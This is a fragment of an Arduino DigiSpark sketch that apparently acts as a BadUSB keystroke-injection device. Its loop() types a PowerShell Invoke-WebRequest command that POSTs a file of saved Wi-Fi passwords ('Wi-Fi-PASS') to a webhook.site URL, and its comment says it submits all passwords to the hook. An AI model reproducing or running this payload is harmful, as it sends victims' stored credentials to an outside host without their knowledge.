...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/7cf1d604-9b17-4d80-9b6e-a6224e02c8b3 -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
